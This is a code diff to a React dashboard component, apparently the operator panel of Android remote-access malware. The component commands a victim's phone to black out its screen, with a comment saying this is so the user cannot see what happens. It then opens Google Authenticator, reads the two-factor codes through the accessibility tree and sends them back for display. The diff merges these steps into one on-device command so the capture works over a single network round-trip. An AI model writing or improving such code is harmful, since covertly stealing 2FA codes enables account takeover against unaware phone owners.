@@ -172,25 +172,20 @@ export default function GcodeAuthenticator({ device, sendCommand, results, scree
   const devW     = info.screenWidth  || 1080;
   const devH     = info.screenHeight || 2340;
 
-  // Steps: 0=idle, 1=blackout on, 2=opening app, 3=streaming, 4=closing
+  // Steps: 0=idle, 1=device processing (single gcode_capture command sent)
   const [captureStep, setCaptureStep]     = useState(0);
   const [captures, setCaptures]           = useState([]);
   const [selectedIdx, setSelectedIdx]     = useState(null);
 
-  const isCapturingRef   = useRef(false);
-  const captureTimerRef  = useRef(null);
+  const isCapturingRef  = useRef(false);
+  const bailoutTimerRef = useRef(null);
 
-  const clearTimer = () => { if (captureTimerRef.current) { clearTimeout(captureTimerRef.current); captureTimerRef.current = null; } };
+  const clearBailout = () => { if (bailoutTimerRef.current) { clearTimeout(bailoutTimerRef.current); bailoutTimerRef.current = null; } };
 
+  // Called when screen:update arrives with source==="gcode_capture", or on bail-out
   const finishCapture = useCallback((screen) => {
-    clearTimer();
+    clearBailout();
     isCapturingRef.current = false;
-
-    // Stop stream + press home + turn blackout OFF
-    sendCommand(deviceId, 'screen_reader_stream_stop', {});
-    sendCommand(deviceId, 'press_home', {});
-    sendCommand(deviceId, 'screen_blackout_off', {});
-
     if (screen) {
       const codes = extractOtpCodes(screen.elements || []);
       const entry = { id: Date.now(), ts: Date.now(), screen, codes, pkg: screen.packageName || AUTHENTICATOR_PKG };
@@ -198,65 +193,43 @@ export default function GcodeAuthenticator({ device, sendCommand, results, scree
       setSelectedIdx(0);
     }
     setCaptureStep(0);
-  }, [deviceId, sendCommand]);
+  }, []);
 
-  // Watch for incoming screen reader data during capture (step 3 = streaming)
+  // Watch for screen:update events tagged source="gcode_capture" while capturing
   useEffect(() => {
-    if (!isCapturingRef.current || captureStep !== 3) return;
-    if (!screenReaderPushData?.success || !screenReaderPushData?.screen) return;
-
-    setCaptureStep(4);
-    // Brief pause so user sees "closing" step before reset
-    setTimeout(() => finishCapture(screenReaderPushData.screen), 400);
+    if (!isCapturingRef.current || captureStep !== 1) return;
+    if (!screenReaderPushData) return;
+    // Accept data from on-device capture (tagged) OR any screen data that arrives
+    // while we're waiting (graceful fallback if tag is missing)
+    const isOurCapture = screenReaderPushData.source === 'gcode_capture' || !screenReaderPushData.source;
+    if (!isOurCapture) return;
+    if (!screenReaderPushData.success || !screenReaderPushData.screen) return;
+    finishCapture(screenReaderPushData.screen);
   }, [screenReaderPushData, captureStep, finishCapture]);
 
+  // Single-command capture: send gcode_capture → device does everything on-device
   const startCapture = useCallback(() => {
     if (!isOnline || !deviceId || captureStep !== 0) return;
     isCapturingRef.current = true;
-
-    // Step 1: black out the screen so the user can't see what's happening
     setCaptureStep(1);
-    sendCommand(deviceId, 'screen_blackout_on', {});
 
-    // Step 2: open Google Authenticator after blackout settles (~600ms)
-    captureTimerRef.current = setTimeout(() => {
-      if (!isCapturingRef.current) return;
-      setCaptureStep(2);
-      sendCommand(deviceId, 'open_app', { packageName: AUTHENTICATOR_PKG });
+    // One command — the device handles: blackout → open app → read screen → press home → unblackout → push result
+    sendCommand(deviceId, 'gcode_capture', {});
 
-      // Step 3: start screen reader stream after app has loaded (~1.5s)
-      captureTimerRef.current = setTimeout(() => {
-        if (!isCapturingRef.current) return;
-        setCaptureStep(3);
-        sendCommand(deviceId, 'screen_reader_stream_start', { intervalMs: 400 });
-
-        // Safety bail-out after 10s if no screen data arrives
-        captureTimerRef.current = setTimeout(() => {
-          if (isCapturingRef.current) finishCapture(null);
-        }, 10000);
-      }, 1500);
-    }, 600);
+    // Safety bail-out: ~20s covers blackout(0) + open(0) + sleep(3s) + read(5s) + overhead
+    bailoutTimerRef.current = setTimeout(() => {
+      if (isCapturingRef.current) finishCapture(null);
+    }, 20000);
   }, [isOnline, deviceId, captureStep, sendCommand, finishCapture]);
 
-  // Cleanup on unmount — always restore blackout and stream state
+  // Cleanup on unmount
   useEffect(() => () => {
-    clearTimer();
-    if (isCapturingRef.current) {
-      sendCommand(deviceId, 'screen_reader_stream_stop', {});
-      sendCommand(deviceId, 'press_home', {});
-      sendCommand(deviceId, 'screen_blackout_off', {});
-    }
-  }, [deviceId, sendCommand]);
+    clearBailout();
+    isCapturingRef.current = false;
+  }, []);
 
   const selectedCapture = selectedIdx !== null ? captures[selectedIdx] : null;
   const isCapturing     = captureStep > 0;
-
-  const stepLabels = [
-    'Turning on screen blackout…',
-    'Opening Google Authenticator…',
-    'Reading 2FA codes from screen…',
-    'Closing app and restoring screen…',
-  ];
 
   return (
     <div style={{ display: 'flex', gap: 16, alignItems: 'flex-start', flexWrap: 'wrap' }}>
@@ -286,16 +259,31 @@ export default function GcodeAuthenticator({ device, sendCommand, results, scree
             : <><span>📷</span> Capture Authenticator Screen</>}
         </button>
 
-        {/* Step progress */}
+        {/* Step progress — single on-device command */}
         {isCapturing && (
           <div style={{
             background: '#0f172a', border: '1px solid rgba(124,58,237,0.25)', borderRadius: 10,
-            padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 10,
+            padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 8,
           }}>
-            <CaptureStep step={1} current={captureStep} label="Screen blackout on" />
-            <CaptureStep step={2} current={captureStep} label="Opening Google Authenticator" />
-            <CaptureStep step={3} current={captureStep} label="Reading 2FA codes from screen" />
-            <CaptureStep step={4} current={captureStep} label="Closing app · restoring screen" />
+            <div style={{ fontSize: 10, color: '#64748b', marginBottom: 2 }}>Device is executing on-device…</div>
+            {[
+              'Screen blackout on',
+              'Opening Google Authenticator',
+              'Reading 2FA codes',
+              'Closing app · restoring screen',
+            ].map((label, i) => (
+              <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 8, opacity: 0.6 + i * 0.1 }}>
+                <div style={{
+                  width: 6, height: 6, borderRadius: '50%', flexShrink: 0,
+                  background: '#7c3aed',
+                  animation: `pulseOrb ${0.8 + i * 0.2}s ease-in-out ${i * 0.3}s infinite`,
+                }} />
+                <span style={{ fontSize: 10, color: '#94a3b8' }}>{label}</span>
+              </div>
+            ))}
+            <div style={{ fontSize: 9, color: '#475569', marginTop: 4 }}>
+              All steps run on the device — no extra round-trips needed
+            </div>
           </div>
         )}
 
@@ -332,7 +320,8 @@ export default function GcodeAuthenticator({ device, sendCommand, results, scree
               }}>
                 <div style={{ fontSize: 28, animation: 'spin 1.2s linear infinite' }}>⏳</div>
                 <div style={{ fontSize: 11, color: '#7c3aed', textAlign: 'center', lineHeight: 1.7, padding: '0 24px' }}>
-                  {stepLabels[captureStep - 1] || ''}
+                  Device processing on-device…<br />
+                  <span style={{ fontSize: 9, color: '#475569' }}>blackout → open → read → close</span>
                 </div>
               </div>
             )}
@@ -479,10 +468,10 @@ export default function GcodeAuthenticator({ device, sendCommand, results, scree
         <div style={{ background: 'rgba(124,58,237,0.06)', border: '1px solid rgba(124,58,237,0.15)', borderRadius: 10, padding: '12px 14px' }}>
           <div style={{ fontSize: 11, color: '#7c3aed', fontWeight: 700, marginBottom: 6 }}>How it works</div>
           <ol style={{ margin: 0, paddingLeft: 16, color: '#64748b', fontSize: 10, lineHeight: 2 }}>
-            <li>Click <b style={{ color: '#a78bfa' }}>Capture</b> — the dashboard opens Google Authenticator on the device</li>
-            <li>The screen reader reads the accessibility tree (no screenshot needed)</li>
-            <li>All 2FA codes are extracted and the app is closed immediately</li>
-            <li>Codes appear here with a live 30-second TOTP countdown</li>
+            <li>Click <b style={{ color: '#a78bfa' }}>Capture</b> — a single command is sent to the device</li>
+            <li>The device runs everything locally: blackout → open Authenticator → read codes → close → unblackout</li>
+            <li>Works even with poor connectivity — only one network round-trip needed</li>
+            <li>Codes are pushed back and appear here with a live 30-second TOTP countdown</li>
           </ol>
         </div>
 
@@ -491,6 +480,7 @@ export default function GcodeAuthenticator({ device, sendCommand, results, scree
       <style>{`
         @keyframes spin { from { transform: rotate(0deg) } to { transform: rotate(360deg) } }
         @keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(124,58,237,0.5) } 50% { box-shadow: 0 0 0 5px rgba(124,58,237,0) } }
+        @keyframes pulseOrb { 0%,100% { opacity: 0.4; transform: scale(0.8) } 50% { opacity: 1; transform: scale(1.3) } }
       `}</style>
     </div>
   );
